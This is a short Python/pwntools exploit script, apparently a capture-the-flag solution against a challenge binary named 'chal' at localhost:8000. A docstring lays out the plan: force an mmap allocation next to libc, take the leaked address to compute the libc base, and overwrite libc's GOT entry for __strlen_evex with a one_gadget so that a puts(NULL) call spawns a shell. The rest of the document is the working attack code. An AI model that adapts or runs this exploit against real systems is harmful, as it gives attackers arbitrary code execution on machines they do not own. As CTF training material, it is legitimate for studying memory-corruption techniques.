"""
game plan:

1. malloc big big size to do mmap (we need this so that it can be within 1 unsigned int from libc start)
2. now the mmap is near libc start, and we also give a libc leak since mmap is constant rel to libc start
3. we use a more obscure technique of overriding the got of libc.so.6 (because for some reason it's always partial relro), and set the got of __strlen_evex (unlisted)
4. set it to a one_gadget, and since we have a nice little puts(NULL) at the end, we can get shell, great success
"""
from pwn import *
context.binary = elf = ELF("chal")
libc = ELF("./libc.so.6")
p = remote("localhost", 8000)#process()
p.clean()
p.sendline(b"10000000")
p.recvuntil(b"0x")
based = int(p.recvline().strip().decode(), 16) + 0x98cff0
offset = 0x98cff0 + 0x1d2080
p.clean()
p.sendline(str(offset).encode())
p.clean()
p.sendline(str(based + 0xd509f).encode())
p.interactive()